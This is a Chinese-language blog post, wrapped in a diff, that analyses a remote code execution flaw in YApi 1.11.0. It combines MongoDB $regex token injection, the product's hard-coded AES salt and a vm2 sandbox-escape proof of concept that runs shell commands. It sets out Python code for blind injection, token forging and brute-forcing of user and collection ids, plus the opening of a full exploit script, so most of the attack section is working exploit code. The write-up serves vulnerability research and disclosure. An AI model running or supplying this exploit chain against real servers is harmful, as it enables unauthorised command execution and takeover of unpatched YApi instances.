@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>MPS-2022-60494 YApi 1.11.0 远程代码执行漏洞</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Web'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/mps-2022-60494-yapi-1.11.0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="MPS-2022-60494 YApi 1.11.0 远程代码执行漏洞">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MPS-2022-60494 YApi 1.11.0 远程代码执行漏洞">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/mps-2022-60494-yapi-1.11.0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/mps-2022-60494-yapi-1.11.0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/mps-2022-60494-yapi-1.11.0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>MPS-2022-60494 YApi 1.11.0 远程代码执行漏洞</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            November 16, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="漏洞参考信息">漏洞参考信息</h1>
+<p><a href="https://www.oscs1024.com/hd/MPS-2022-60494">情报</a></p>
+<p><a href="https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c">修复commit</a></p>
+<h1 id="分析">分析</h1>
+<h2 id="yapi">YApi</h2>
+<p><a href="https://github.com/YMFE/yapi">github链接</a></p>
+<p>环境搭建可以参考官方文档</p>
+<h2 id="分析commit">分析commit</h2>
+<p>分析最新的commit。发现主要修复的地方有两个：</p>
+<p>第一个是preScript的if语句多加了一个限制</p>
+<p><img src="https://s2.loli.net/2022/11/17/zGqcd73iDIX1arF.png" alt="image-20221116203147507"></p>
+<p>结合漏洞情报，基本可以猜到是进if后可以触发一个script命令执行，然后这次commit把进入if的条件改得更加苛刻。</p>
+<p>另一个修复是加了一个判断token的类型是否为string</p>
+<p><img src="https://s2.loli.net/2022/11/17/irjzdOan4mu2Y7X.png" alt="image-20221116203651822"></p>
+<p>熟悉mongoDB注入的同学应该很清楚，如果在查询语句token直接作为一个对象传进去是可以造成注入的。常用解决方法也就是判断其是否为string类型。</p>
+<p>所以其实通过这两个更新可以大胆猜测，可能该漏洞的利用思路就是先注入出token，然后用token去执行script脚本。</p>
+<h2 id="mongodb注入">mongoDB注入</h2>
+<p>直奔注入点。容易发现token是用户可控的，最终会在<code>server/models/token.js</code>进入查询语句</p>
+<p><img src="https://s2.loli.net/2022/11/17/ocZkE9WH4LJz5PY.png" alt="image-20221116205215607"></p>
+<p>前端token以json形式发过去即可造成注入。理论上可以利用mongoDB <code>$regex</code>语法盲注出所有token。</p>
+<h2 id="pre_script沙箱逃逸">pre_script沙箱逃逸</h2>
+<p><code>/api/open/run_auto_test</code>路由服务器可以运行用户自定义的脚本。其中的代码可以在项目-设置-请求配置编写。</p>
+<p><img src="https://s2.loli.net/2022/11/17/s7PTSyvAf4VburH.png" alt="image-20221116205913932"></p>
+<p>pre_script最终在common/postmanLib.js执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> sandboxByNode(sandbox <span style="color:#ff79c6">=</span> {}, script) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> vm <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;vm&#39;</span>);
+</span></span><span style="display:flex;"><span>  script <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> vm.Script(script);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> context <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> vm.createContext(sandbox);
+</span></span><span style="display:flex;"><span>  script.runInContext(context, {
+</span></span><span style="display:flex;"><span>    timeout<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">10000</span>
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> sandbox;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> sandbox(context <span style="color:#ff79c6">=</span> {}, script) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (isNode) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>      context.context <span style="color:#ff79c6">=</span> context;
+</span></span><span style="display:flex;"><span>      context.console <span style="color:#ff79c6">=</span> console;
+</span></span><span style="display:flex;"><span>      context.<span style="color:#8be9fd;font-style:italic">Promise</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">Promise</span>;
+</span></span><span style="display:flex;"><span>      context.setTimeout <span style="color:#ff79c6">=</span> setTimeout;
+</span></span><span style="display:flex;"><span>      context <span style="color:#ff79c6">=</span> sandboxByNode(context, script);
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (err) {
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中script是用户可控的内容。</p>
+<p>yapi使用的vm2依赖版本是<code>^3.8.4</code>，存在沙箱逃逸漏洞 CVE-2022-36067</p>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> pwn <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">Error</span>.prepareStackTrace <span style="color:#ff79c6">=</span> (_, c) =&gt;
+</span></span><span style="display:flex;"><span>    c.map((c) =&gt; c.getThis()).find((a) =&gt; a <span style="color:#ff79c6">&amp;&amp;</span> a.process);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> { stack } <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>();
+</span></span><span style="display:flex;"><span>    console.info(stack.process.mainModule);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> stack.process.mainModule.require(<span style="color:#f1fa8c">&#39;child_process&#39;</span>).execSync(<span style="color:#f1fa8c">&#39;whoami&#39;</span>).toString();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>requestHeader <span style="color:#ff79c6">=</span> pwn();
+</span></span></code></pre></div><p>这里<code>requestHeader</code>变量是为了控制auto test返回的值，达到命令执行获得回显的效果。</p>
+<h2 id="权限控制分析">权限控制分析</h2>
+<p>审计base.js，会发现YApi提供了open api，当用户访问以下路由时可以使用token而免登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> openApiRouter <span style="color:#ff79c6">=</span> [
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/open/run_auto_test&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/open/import_data&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/add&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/save&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/up&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/get&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/list&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/list_menu&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f1fa8c">&#39;/api/interface/add_cat&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/interface/getCatMenu&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/interface/list_cat&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/project/get&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/plugin/export&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/project/up&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#39;/api/plugin/exportSwagger&#39;</span>
+</span></span><span style="display:flex;"><span>    ];
+</span></span></code></pre></div><p>其中包括了必要的<code>/api/open/run_auto_test</code>路由和修改<code>pre_script</code>的<code>/api/project/up</code>路由。</p>
+<p>YApi会对接收到的token做解密处理，在server/utils/token.js中可以看到具体代码。解密使用了AES-192，其key和iv值由EVP_BytesToKey函数根据指定的盐获得。这个盐在YApi中是写死的。</p>
+<p><img src="https://s2.loli.net/2022/11/17/d1ucOkw8JstQ3bR.png" alt="image-20221116225809545"></p>
+<p>解码后的信息由<code>uid|token</code>形式组成。uid即是用户id，token（注意是解密后的token）则对应唯一的project。</p>
+<p>YApi会在mongoDB里维护一个token集合，里面存放着token和project_id的对应关系。</p>
+<p><img src="https://s2.loli.net/2022/11/17/aiIrPZnw5bHyUmt.png" alt="image-20221116211428601"></p>
+<p>另外运行脚本的路由<code>run_auto_test</code>还需要指定一个参数：测试集合id（下面简记为cid）。而获取cid的api: <code>/api/col/list</code>并不在openApi之列。所以后续需要爆破。</p>
+<h1 id="攻击思路和poc编写">攻击思路和POC编写</h1>
+<h2 id="开放注册">开放注册</h2>
+<p>如果开放注册，加密后的token可以直接从前端看到。</p>
+<p><img src="https://s2.loli.net/2022/11/17/MYPdRJA6Umv9qDT.png" alt="image-20221116230606151"></p>
+<p>接下来只需要创建一个测试合计，编写pre_script就行，这里就不赘述了。</p>
+<h2 id="不开放注册">不开放注册</h2>
+<p>如果不开放测试，就需要注入token来调open api达到修改pre_script、执行代码的功能。但是由于open api的限制，如果注出来的token对应的project没有对应集合的话，是没有办法利用的，这也是这个漏洞的局限性。</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>利用路由<code>/api/project/up</code>，token正确与否会影响回显，达到盲注的效果。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;token&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;$regex&#34;</span>: <span style="color:#f1fa8c">&#34;^&#34;</span> <span style="color:#ff79c6">+</span> guess,
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;id&#34;</span>: <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>t <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/project/up&#39;</span>, json<span style="color:#ff79c6">=</span>payload)<span style="color:#ff79c6">.</span>text
+</span></span></code></pre></div><h3 id="token加解密">token加解密</h3>
+<p>根据server/utils/token.js写出对应的python加解密算法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> hashlib <span style="color:#ff79c6">import</span> md5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>default_salt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;abcde&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BS <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">EVP_BytesToKey</span>(password, salt, key_len, iv_len):
+</span></span><span style="display:flex;"><span>    dtot <span style="color:#ff79c6">=</span> md5(password <span style="color:#ff79c6">+</span> salt)<span style="color:#ff79c6">.</span>digest()
+</span></span><span style="display:flex;"><span>    d <span style="color:#ff79c6">=</span> [dtot]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">len</span>(dtot) <span style="color:#ff79c6">&lt;</span> (iv_len <span style="color:#ff79c6">+</span> key_len):
+</span></span><span style="display:flex;"><span>        d<span style="color:#ff79c6">.</span>append(md5(d[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">+</span> password <span style="color:#ff79c6">+</span> salt)<span style="color:#ff79c6">.</span>digest())
+</span></span><span style="display:flex;"><span>        dtot <span style="color:#ff79c6">+=</span> d[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> dtot[:key_len], dtot[key_len:key_len <span style="color:#ff79c6">+</span> iv_len]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pad</span>(data):
+</span></span><span style="display:flex;"><span>    padding <span style="color:#ff79c6">=</span> BS <span style="color:#ff79c6">-</span> <span style="color:#8be9fd;font-style:italic">len</span>(data) <span style="color:#ff79c6">%</span> BS
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> data <span style="color:#ff79c6">+</span> (padding <span style="color:#ff79c6">*</span> <span style="color:#8be9fd;font-style:italic">chr</span>(padding))<span style="color:#ff79c6">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpad</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> data[<span style="color:#bd93f9">0</span>:<span style="color:#ff79c6">-</span>data[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(hex_data, password):
+</span></span><span style="display:flex;"><span>    key, iv <span style="color:#ff79c6">=</span> EVP_BytesToKey(password, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#bd93f9">24</span>, <span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(hex_data)
+</span></span><span style="display:flex;"><span>    aes <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(key, AES<span style="color:#ff79c6">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> unpad(aes<span style="color:#ff79c6">.</span>decrypt(data))<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;u tf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encrypt</span>(data, password):
+</span></span><span style="display:flex;"><span>    key, iv <span style="color:#ff79c6">=</span> EVP_BytesToKey(password, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#bd93f9">24</span>, <span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>    aes <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(key, AES<span style="color:#ff79c6">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> aes<span style="color:#ff79c6">.</span>encrypt(pad(data))<span style="color:#ff79c6">.</span>hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encode_token</span>(uid, plain):
+</span></span><span style="display:flex;"><span>    plain <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(uid) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;|&#39;</span> <span style="color:#ff79c6">+</span> plain
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> encrypt(plain<span style="color:#ff79c6">.</span>encode(), default_salt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decode_token</span>(et):
+</span></span><span style="display:flex;"><span>    de <span style="color:#ff79c6">=</span> decrypt(et, default_salt)<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;|&#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> de
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># foo   90809dc9677e1a50aebfe4e2d4a95abd</span>
+</span></span><span style="display:flex;"><span>    encrypted <span style="color:#ff79c6">=</span> encrypt(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;foo&#39;</span>, default_salt)  <span style="color:#6272a4"># str</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(encrypted)
+</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff79c6">=</span> decrypt(encrypted, default_salt)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(decrypted)
+</span></span></code></pre></div><p>（当然更高明的方法是命令行调用node  乐）</p>
+<h3 id="爆破uid">爆破uid</h3>
+<p>虽说理论上可以注入出所有token，但是在实际利用中由于布尔注入对网络和waf拦截规则的要求很高，往往只能掌握为数不多的token。在获取这个plain_token后可以通过encrypted_token由uid和plain_token组成的原理，结合<code>/api/project/get?token=</code>这个路由爆破uid，从而来确定token对应的uid。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> uid <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># print(&#39;Trying uid: &#39; + str(uid))</span>
+</span></span><span style="display:flex;"><span>    et <span style="color:#ff79c6">=</span> utils<span style="color:#ff79c6">.</span>encode_token(uid, self<span style="color:#ff79c6">.</span>token)
+</span></span><span style="display:flex;"><span>    text <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/project/get?token=&#39;</span> <span style="color:#ff79c6">+</span> et)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;没有权限&#39;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> text:
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(text)[<span style="color:#f1fa8c">&#39;data&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> uid <span style="color:#ff79c6">==</span> data[<span style="color:#f1fa8c">&#39;uid&#39;</span>]:
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>pid <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#39;_id&#39;</span>]
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>uid <span style="color:#ff79c6">=</span> uid
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>et <span style="color:#ff79c6">=</span> utils<span style="color:#ff79c6">.</span>encode_token(self<span style="color:#ff79c6">.</span>uid, self<span style="color:#ff79c6">.</span>token)
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Found uid: &#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>uid))
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
+</span></span></code></pre></div><h3 id="update-project">update project</h3>
+<p>通过<code>/api/project/up</code>路由修改pre_script</p>
+<h3 id="爆破cid">爆破cid</h3>
+<p>最后借助<code>/api/open/run_auto_test</code>路由爆破cid。可以在pre_script中echo一些特定的字符串，如果run_auto_test返回乐这些字符串则是正确的cid。比如echo一段恶臭数字<code>echo '1145141919810'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> cid <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># print(&#39;Trying cid: &#39; + str(cid))</span>
+</span></span><span style="display:flex;"><span>    text <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;/api/open/run_auto_test?token=</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&amp;id=</span><span style="color:#f1fa8c">{</span>cid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;1145141919810&#39;</span> <span style="color:#ff79c6">in</span> text:
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Found cid: &#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(cid))
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>cid <span style="color:#ff79c6">=</span> cid
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span>
+</span></span></code></pre></div><h3 id="rce">RCE</h3>
+<p>当pid，uid和cid都确定下来后，就可以通过<code>/api/project/up</code>修改pre_script，<code>/api/open/run_auto_test</code>命令执行了。</p>
+<h2 id="完整poc">完整POC</h2>
+<p>再加上亿点点细节：</p>
+<p><a href="https://github.com/KingBridgeSS/MPS-2022-60494">https://github.com/KingBridgeSS/MPS-2022-60494</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> utils
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://127.0.0.1:3000&#39;</span>
+</span></span><span style="display:flex;"><span>log <span style="color:#ff79c6">=</span> logging<span style="color:#ff79c6">.</span>getLogger(<span style="color:#f1fa8c">&#34;yapi_cracker&#34;</span>)
+</span></span><span style="display:flex;"><span>logging<span style="color:#ff79c6">.</span>basicConfig(level<span style="color:#ff79c6">=</span>logging<span style="color:#ff79c6">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">NoRegister</span>:
+</span></span><span style="display:flex;"><span>    token <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>  <span style="color:#6272a4"># 未加密的token</span>
